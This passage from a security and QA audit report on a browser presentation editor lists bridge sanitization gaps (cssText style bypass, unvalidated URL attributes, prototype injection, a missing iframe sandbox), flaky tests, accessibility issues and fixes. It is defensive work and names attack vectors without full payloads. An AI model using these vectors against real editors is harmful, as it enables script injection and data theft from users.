| ФАЗА 5 — NVDA / VoiceOver test | Did not run; confirmed `aria-live` regions exist via `editor/presentation-editor.html` grep (`aria-live` appears 8+ times), confirmed `role="status"` / `role="alert"` exist on toasts. | Low |
| ФАЗА 6 — Open .pptx in LibreOffice + count pages | Did not run. Confirmed `exportPptx()` calls `pptx.writeFile({fileName: …})` and that no test asserts archive contents (FN-001). | Medium |
| ФАЗА 7 — Run gate-A 3× back-to-back for flake | Ran 1×; no failures. Did not have time for 3×. Captured the existing flake-fix history from CHANGELOG (v2.0.7, v2.0.12) and the 42 waitForTimeout sites for systemic risk. | Medium |
| ФАЗА 7 — standalone-run each spec | Did not enumerate; the v2.0.12 changelog explicitly notes that `transform-resolve.spec.js` was hardened for standalone runs after the architecture audit, suggesting the standalone-run audit *was* recently done. | Low |

I would re-run with a real browser MCP to close these gaps. The gate-D run that
was still in progress at the moment of report compilation is not blocking — its
findings are already classified under BUG-002 (LOW per ADR-018).

---

## 5. Flake Inventory

3-iteration flake-rate not measured (see Coverage Gaps). Single-run baseline:

| Test file | `waitForTimeout` count | Notes |
|---|---|---|
| telemetry-viewer.spec.js | 15 | Heaviest concentration — high flake risk on slow Windows runners. |
| tablet-honest.spec.js | 6 | Mobile/tablet flow — already known to be timing-sensitive. |
| inspector-validators-badges.spec.js | 4 | One was already-fixed (v2.0.7); 4 more remain. |
| trust-banner.spec.js | 3 | |
| broken-asset-banner.spec.js | 3 | Sleeps of 800ms / 1500ms / 1500ms — the 1500ms ones are the most suspicious. |
| click-blocked-feedback.spec.js | 2 | |
| foreign-deck-compat.spec.js | 2 | |
| autosave-cap.spec.js | 1 | |
| bridge-sanitize.spec.js | 2 | 500ms + 400ms — bridge round-trip races. |
| inspector-basic-geometry.spec.js | 1 | |
| shortcuts-table.spec.js | 2 | |
| tablet-honest.spec.js | (already counted) | |

Total: 42 occurrences across 14 files. Pattern of v2.0.7 / v2.0.12 fixes
suggests the team already knows these are technical debt; the work is
incremental.

---

## 6. Performance Baseline

Not measured this audit. Static signals:

| Metric | Source | Static value | Risk |
|---|---|---|---|
| HISTORY_LIMIT (undo depth) | `editor/src/constants.js:111` | 20 patches | none — bounded |
| Autosave warn-byte threshold | `tests/playwright/specs/autosave-cap.spec.js` test names | tier transition exists | none — light-snapshot fallback works |
| sessionStorage autosave key | `editor/src/clipboard.js:97` | sessionStorage (per-tab) | OK — survives F5, lost on tab close |
| Bridge heartbeat interval | `editor/src/context-menu.js:889` | window.setInterval | OK |
| BRIDGE_STALE_THRESHOLD_MS | grep-found in same file | implicit constant | should verify value but did not |
| RAF-coalesced selection render | `tests/playwright/selection-perf.spec.js` (gate-B) | 100-elem fixture exists | unmeasured — gate-B not run |

**Recommendation:** Run `selection-perf.spec.js` directly with the Smart-Import-modal-dismiss patch (see BUG-001 fix), capture p50 click-cost, store as baseline. Add a 200-elem fixture and a 50-slide × 30-elem fixture. Add a long-session memory test (currently `long-session-sync.spec.js` runs 100 mutations — push to 1000 + measure heap).

---

## 7. Security Posture Update

Cross-checking against the ADR-014 / AUDIT-D series visible in the repo:

| Item | Previous status | Current status | Note |
|---|---|---|---|
| AUDIT-D-02 (parseSingleRoot sanitization) | Closed in v0.34.x via `bridge-sanitize.spec.js` | **Confirmed closed** for replace-node-html / replace-slide-html / insert-element. **NOT extended** to other mutation paths — see SEC-001..003. |
| AUDIT-D-03 (PptxGenJS vendor + SRI) | Closed | **Confirmed closed** — `editor/src/export.js:62-83` uses vendored copy by default, CDN fallback has SRI. |
| AUDIT-D-04 (postMessage origin) | Closed | **Confirmed closed** — `bridge.js:48-55` rejects unexpected origins; `bridge-script.js:3464-3471` mirrors. file:// case correctly returns `["null"]` origin. |
| AUDIT-D-05 (autosave size cap) | Closed | **Confirmed closed** — `autosave-cap.spec.js` has full coverage. |
| AUDIT-D-15 (bridge token entropy) | Closed | **Confirmed closed** — `import.js:869-897` uses `crypto.getRandomValues(24)` = 192 bits. |
| AUDIT-D-01 (trust signals) | Closed | **Confirmed closed in detection** (`scanTrustSignals` finds scripts/handlers/jsUrls/iframes/meta-refresh/object-embed); banner UI exists. **Default sandbox-mode is OFF** — see SEC-007. Neutralize action does the right strips but misses `<base>`, `<form>`, `<input>`, srcdoc, SVG `<animate>` etc. |
| **NEW** SEC-001 (cssText apply-style bypass) | Not previously tracked | **Open** |
| **NEW** SEC-002 (update-attributes URL not validated) | Not previously tracked | **Open** |
| **NEW** SEC-003 (replace-image-src URL not validated) | Not previously tracked | **Open** |
| **NEW** SEC-004 (inbound bridge schema bypass) | Hinted at by audit notes | **Open** |
| **NEW** SEC-005 (3 unregistered bridge message types) | Not previously tracked | **Open** |
| **NEW** SEC-006 (prototype-injection on slide-keyed dicts) | Not previously tracked | **Open** |
| **NEW** SEC-007 (iframe sandbox attribute missing entirely) | Not previously tracked at attribute-level | **Open** |

Net new security findings this audit: **7**, all LOW-to-MEDIUM impact in
practice (because of the sandbox-OFF / trust-banner architecture, the threat
surface is "you ran an untrusted deck without neutralizing first").

---

## 8. A11y Posture

| State | axe scan result | Notes |
|---|---|---|
| empty | 0 violations | confirmed PASS |
| loaded-preview | 2 serious (color-contrast + nested-interactive) | `test.fail(true)` shields |
| loaded-edit | 2 serious (same as above) | `test.fail(true)` shields |

Both violations have stable text (same RGB triplet, same selector targets) over
6+ months → no drift. Recommended fix path is well-understood and the actual
work is small (CSS token tweak + slide-rail markup restructure).

The remaining keyboard-nav coverage (P0-05, P0-08 markers) passes cleanly.
Contrast-only token tests (`contrast.spec.js`) pass cleanly — meaning the new
token additions are AA-compliant; only the legacy `--color-secondary` is the
problem.

---

## 9. Prioritized Action List (top 15)

Sorted by (impact × ease). All effort estimates are calibrated to a single
focused session for one engineer.

| # | ID | Action | Effort | Impact |
|---|---|---|---|---|
| 1 | BUG-001 | Inline modal-dismiss step into `loadBasicDeckAndWait` (also `loadPerfDeck` for gate-B) | XS | High — restores 152/152 contract gate, unblocks gate-B |
| 2 | SEC-001 | Reject `cssText` as `styleName` in `validateApplyStyle` + `validateApplyStyles` + bridge handler | XS | High — closes one stable XSS-adjacent foothold |
| 3 | SEC-002 | Mirror `URL_ATTRS` block from sanitizeFragment into `updateAttributes` | XS | High — closes parity gap with parseSingleRoot |
| 4 | SEC-003 | Reuse `InputValidators.url` inside `validateReplaceImageSrc` | XS | High — closes parity gap |
| 5 | SEC-005 | Register `runtime-warn`, `container-mode-ack`, `sibling-rects-response` in `BRIDGE_MESSAGES`/`SCHEMA_FREE_TYPES` | XS | Medium — prerequisite for SEC-004 fix |
| 6 | BUG-003 | Move gate-visual to a different test-server port (mirror gate-a11y trick) | XS | Medium — devex |
| 7 | ARCH-003 | Use `_SHELL_TARGET` in the `runtime-warn` post call | XS | Low — defense in depth |
| 8 | A11Y-001 | Darken `--color-secondary` token, restructure `.slide-item` markup, remove `test.fail(true)` from 2 a11y tests | M | High — closes WCAG AA gap, allows public GA |
| 9 | SEC-004 | Wrap inbound bridge dispatch in `BRIDGE_SCHEMA.validateMessage` | S | High — single chokepoint, defense in depth |
| 10 | SEC-006 | Switch slide-keyed dictionaries to `Object.create(null)` OR reject `__proto__`/`constructor`/`prototype` slide IDs | S | Medium |
| 11 | FN-001 | Add 3 PPTX archive-content tests (output buffer ≥5 KB, slide1.xml has expected text, [Content_Types].xml has N slides) | M | Medium — first real fidelity gate |
| 12 | BUG-002 | Audit gate-D-failing tests and add `test.skip(isMobile, …)` guards | M | Low/Medium — restores gate-D as a useful signal |
| 13 | FLAKE-001 | Begin sweeping `waitForTimeout` → `expect.poll` (start with telemetry-viewer.spec.js — 15 sites) | M (per file) | Medium |
| 14 | SEC-007 | Add `sandbox="allow-same-origin allow-scripts allow-popups allow-forms"` to `#previewFrame` | M | Medium — needs reference-deck regression sweep |
| 15 | FLAKE-002 | Real test for file:// origin path (BO3) — Playwright `launch` with file:// URL, no test server | S | Medium — covers the editor's core promise |

Items 1–7 (all XS effort) collectively close one HIGH bug, three HIGH security findings, one MEDIUM, and one LOW. They all fit in one ~2-hour `v2.0.13` polish tag.

---

## 10. Verdict

| Axis | Score (1-10) | Note |
|---|---|---|
| Functional | 8 | Editor honors its core promise. Only one functional regression detected (BUG-001), one is mobile-only (ADR-018 gives cover), PPTX has unmeasured fidelity. |
| Security | 6 | Solid trust-banner + parseSingleRoot foundation, but cssText bypass + URL-attr parity gaps + iframe-sandbox-default-OFF leave a meaningful surface. All findings are LOW-to-MEDIUM in real-world impact because of the trust-banner mitigation, but the gaps are real. |
| Performance | 7 | Bounded-data design is sound (HISTORY_LIMIT, autosave tiers, RAF coalescing). No measurements taken this audit to validate at scale. |
| A11y | 5 | Two stable serious WCAG-AA violations shielded by `test.fail(true)` for 6+ months. Coverage 27 / 50+ target. |
| Docs | 7 | SOURCE_OF_TRUTH / CHANGELOG / V2-MASTERPLAN / POST_V2_ROADMAP all consistent and dated. SoT correctly flags PPTX as Beta. Drift: gate-contract is documented as a real gate but doesn't pass; CHANGELOG v2.0.11 architecture-audit honest-note already concedes some of this. |
| Release-readiness for **internal pilot** | **8** | Same as `docs/SOURCE_OF_TRUTH.md`'s "internal v2 GA / public beta" claim. |
| Release-readiness for **public GA** | **5** | Blocked on A11Y-001 fix, gate-contract green, PPTX archive assertions, sandbox decision. |

**Ship recommendation:** Land items 1–7 from the prioritized action list as
**`v2.0.13` polish tag** (all XS effort, defense-in-depth + dev-experience).
Then take items 8–11 as a focused **`v2.1.0` "release-readiness" sprint**
before opening the door to public-GA marketing. Item 14 (iframe sandbox)
should not block v2.1.0 — schedule it for a dedicated `v2.2.0` after a real
reference-deck regression sweep, because at least Reveal/Impress will need
testing under the new sandbox flags.

This editor is in genuinely good shape. The findings are not "the architecture
is wrong" findings — they are "the seven mutation paths through the bridge
chokepoint do not all enforce the same rules" findings, plus standard a11y
backlog and "we know about it" architecture notes. None require redesign.

---

## Appendix A — Commands run

All paths are absolute on the audit machine. Output captured to `/tmp/gate-*.log`
or to background-task `.output` files; key extracts in §1, §3, §5 of this report.

| # | Time (UTC+3) | Command | Result |
|---|---|---|---|
| 01 | 15:36 | `git log --oneline -20 && git tag --list "v2.0.*" && git status` | HEAD = `075f9a9`, tags v2.0.0..v2.0.12, untracked `.obsidian/` only |
| 02 | 15:36 | `wc -l editor/src/*.js \| sort -rn` | 26 383 LOC across 50 modules; bridge-script.js = 3 809 |
| 03 | 15:36 | `ls tests/playwright/specs/*.spec.js \| wc -l` | 53 |
| 04 | 15:37 | `find tests -name '*.spec.js' \| wc -l` | 66 |
| 05 | 15:37 | `awk '/^      const state = \\{/,/^      \\};/{print}' editor/src/state.js \| grep -cE '^[[:space:]]+[a-zA-Z_][a-zA-Z0-9_]*:'` | 147 fields |
| 06 | 15:37 | `npm run typecheck` | PASS, 1.8s |
| 07 | 15:37 | `npm run test:unit` | PASS, 54/0/0, 1.0s |
| 08 | 15:38–15:53 | `npm run test:gate-a -- --reporter=line` (background) | PASS, 278/8/0, 14.8m |
| 09 | 15:54 | `npm run test:gate-contract -- --reporter=line` | **FAIL: 3 failed / 149 passed**, 1.2m |
| 10 | 15:54 | `npm run test:gate-e -- --reporter=line` | PASS, 3/0/0, 11.5s |
| 11 | 15:55–16:06 | `npm run test:gate-d -- --reporter=line` (background) | **127 passed / 26 FAILED / 60 skipped** in 11.5m on chromium-mobile-{390,640} + chromium-tablet-820 |
| 12 | 15:56 | `npm run test:gate-visual -- --reporter=line` (background, FIRST attempt) | FAIL — port 41731 collision with concurrent gate-D |
| 12b | 16:07 | `npm run test:gate-visual -- --reporter=line` (re-run after gate-D finished) | **PASS — 15/0/0** in 45.2s |
| 13 | 15:56–15:58 | `npm run test:gate-a11y` (background, port 41735) | PASS, 27 passed (2 are test.fail(true) shields) |
| 14 | 15:36..15:58 | Various `grep -rn` / `grep -n` searches against `editor/src/`, `tests/playwright/`, `tests/contract/` — see findings for specific patterns | n/a |
| 15 | 15:50 | `node -e "const obj={}; obj['__proto__']={polluted:'set'}; …"` | confirmed local-prototype-rewrite shape (NOT global Object.prototype pollution) |
| 16 | 15:36 | `cat .github/workflows/*.yml` | only `publish-ghcr.yml` exists — confirms NO CI for tests |

---

## Appendix B — Files inspected

Grouped by directory. Items marked with `*` were read in full; others were
sampled (specific line ranges per finding).

`docs/`
- `SOURCE_OF_TRUTH.md` * (272 lines, full)
- `CHANGELOG.md` (lines 1-300 sampled — covers v2.0.7..v2.0.12 detail; rest skimmed)
- `V2-MASTERPLAN.md` (lines 1-200 — current-state and skill-protocol sections)
- `POST_V2_ROADMAP.md` * (172 lines, full)

`editor/src/`
- `bridge-script.js` — sampled ranges 1-75, 100-260, 395-440, 2700-2800, 2985-3115, 3015-3110, 3400-3470, 3530-3650, 3650-3770, 3775-3808
- `bridge.js` * (305 lines, full)
- `bridge-schema.js` * (933 lines, full)
- `bridge-commands.js` (lines 1-200, 60-100)
- `state.js` (lines 1-200, 600-790, 800-900)
- `import.js` (lines 1-130, 614-700, 860-900, 990-1080)
- `boot.js` (lines 90-180, 280-310, 1330-1430, sampled innerHTML sites)
- `feedback.js` (lines 1-60, 1450-1480 — innerHTML sites)
- `slide-rail.js` (lines 1-100 — innerHTML sites)
- `clipboard.js` (lines 60-130)
- `selection.js` (lines 760-810 — copyStyle/pasteStyle)
- `theme.js` (lines 70-160)
- `context-menu.js` (lines 1-100, 480-540, 880-920)
- `precision.js` (lines 80-340)
- `slides.js` (lines 70-340)
- `constants.js` (lines 250-300)
- `preview.js` * (40 lines, full)
- `import-report-modal.js` (lines 38-135)
- `user-action-boundary.js` * (88 lines, full)
- `input-validators.js` (lines 1-80)
- `export.js` (lines 1-95, 325-460)
- `export-pptx/index.js` * (49 lines, full)

`editor/styles/` — directory listed but file contents not inspected (no styling-impact finding emerged).

`editor/`
- `presentation-editor.html` — only the iframe element block (lines 561-580) and the script-include block

`tests/contract/`
- `bridge.contract.spec.js` (lines 1-80)
- `bridge-handshake.contract.spec.js` (lines 110-280)

`tests/playwright/`
- `helpers/editorApp.js` (lines 1-200)
- `selection-perf.spec.js` (lines 1-80)
- `specs/bridge-sanitize.spec.js` * (lines 1-280, full)
- `specs/inspector-validators-badges.spec.js` (lines 60-130)
- `specs/golden-export-clean.spec.js` (lines 1-95)
- `specs/pptx-fidelity-v2.spec.js` (lines 1-60)
- `specs/autosave-cap.spec.js` (lines 140-180)
- `specs/bridge-origin.spec.js` (lines 170-190)

`tests/a11y/`
- `known-violations.md` * (80 lines, full)
- `shell-a11y.spec.js` * (157 lines, full)

`tests/visual/` — directory listed only (gate-visual not run).

`tests/fixtures/`
- `perf-100elem.html` (lines 1-30 sampled — confirmed 100 elements)

`scripts/`
- `test-server-config.js` (lines 1-25)

`playwright.config.js` * (148 lines, full)
`package.json` * (60 lines, full)
`.github/workflows/publish-ghcr.yml` * (full)

---

## Appendix C — Fixtures created during testing

**None.** I did not write or commit any new fixture files this audit. The
malicious-deck fixtures the audit plan suggested (cssText XSS, srcdoc, SMIL,
javascript: action, base href: javascript, meta refresh, etc.) were analyzed
statically against the parseSingleRoot allowlist and the per-handler
protection policies; physical fixtures would only be necessary for the
ФАЗА 2 / ФАЗА 3 manual-browser walk-through that was substituted with
static review (see §4 Coverage Gaps). If the project wants me to land them
as a future test corpus, the destination directory would be
`tests/fixtures/audit-2026-04-26/` and each fixture would be one of:

- `cssText-bypass.html` — proves SEC-001 by attempting a DOM mutation through `apply-style`
- `update-attrs-href-js.html` — proves SEC-002
- `image-src-track.html` — proves SEC-003
- `proto-pollution-slide-id.html` — proves SEC-006
- `iframe-sandbox-escape.html` — proves SEC-007 (reads `parent.localStorage` from iframe script)

I recommend NOT landing these in the main test corpus — instead keep them as
attached artifacts on a security ADR so they don't accidentally run in CI
and become noise.

---

*End of report.*
